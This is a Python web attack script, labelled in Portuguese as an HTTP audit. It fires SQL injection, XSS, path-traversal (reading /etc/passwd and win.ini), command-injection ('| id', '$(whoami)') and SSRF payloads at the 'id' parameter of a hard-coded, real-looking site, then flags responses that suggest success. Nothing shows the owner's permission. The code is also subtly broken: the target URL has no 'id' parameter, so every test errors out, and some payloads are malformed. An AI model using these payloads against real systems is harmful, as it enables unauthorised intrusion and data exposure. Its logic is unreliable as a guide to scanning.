import requests
import itertools
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

TARGET_URL = "https://francodes.dev/"

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

PAYLOADS = {
    "SQLi": [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' UNION SELECT NULL,NULL--",
        "admin' --",
        "1' SLEEP(5)--"
    ],
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>"
    ],
    "LFI": [
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php"
    ],
    "RCE": [
        "; ls -la",
        "&& dir",
        "| id",
        "$(whoami)",
        "; sleep 5"
    ],
    "SSRF": [
        "http://127.0.0.1",
        "http://localhost:80"
    ]
}


def build_test_url(url, payload):
    """
    Substitui somente o valor do parâmetro id.
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if "id" not in params:
        raise ValueError("Parâmetro 'id' não encontrado na URL.")

    params["id"] = [payload]

    new_query = urlencode(params, doseq=True)

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))


def check_response(response, payload_type, payload):
    content = response.text.lower()

    if payload_type == "SQLi":
        indicators = [
            "sql syntax",
            "mysql error",
            "oracle error",
            "postgresql error",
            "driver error"
        ]

        return any(indicator in content for indicator in indicators)

    if payload_type == "XSS":
        return payload.lower() in content

    if payload_type == "LFI":
        indicators = [
            "root:x:0:0",
            "[extensions]",
            "/bin/bash"
        ]

        return any(indicator in content for indicator in indicators)

    if payload_type == "RCE":
        indicators = [
            "uid=",
            "gid=",
            "directory of",
            "total"
        ]

        return any(indicator in content for indicator in indicators)

    return False


def run_exploit_tests():

    print("=" * 70)
    print("              AUDITORIA HTTP")
    print("=" * 70)
    print(f"Target : {TARGET_URL}")
    print("=" * 70)

    headers = {
        "User-Agent": USER_AGENT
    }

    total = 0
    findings = 0

    for vuln_type, payloads in PAYLOADS.items():

        print(f"\n{'-' * 70}")
        print(f"[+] TESTANDO {vuln_type}")
        print(f"{'-' * 70}")

        for payload in payloads:

            total += 1

            try:

                test_url = build_test_url(
                    TARGET_URL,
                    payload
                )

                response = requests.get(
                    test_url,
                    headers=headers,
                    timeout=5
                )

                vulnerable = check_response(
                    response,
                    vuln_type,
                    payload
                )

                if vulnerable:

                    findings += 1

                    status = "[!]"
                    result = "POSSÍVEL ACHADO"

                else:

                    status = "[ ]"
                    result = "Sem indicador"

                print(
                    f"{status} "
                    f"{vuln_type:<6} | "
                    f"HTTP {response.status_code} | "
                    f"{len(response.content):>7} bytes | "
                    f"{result}"
                )

                print(f"    Payload: {payload}")

            except requests.RequestException as e:

                print(
                    f"[?] {vuln_type:<6} | "
                    f"Erro HTTP: {e}"
                )

            except Exception as e:

                print(
                    f"[?] {vuln_type:<6} | "
                    f"Erro: {e}"
                )

    print("\n" + "=" * 70)
    print("                    RESUMO")
    print("=" * 70)

    print(f"Testes executados : {total}")
    print(f"Possíveis achados : {findings}")

    if findings:
        print("[!] Existem respostas que merecem análise manual.")
    else:
        print("[+] Nenhum indicador foi identificado.")

    print("=" * 70)


if __name__ == "__main__":
    run_exploit_tests()
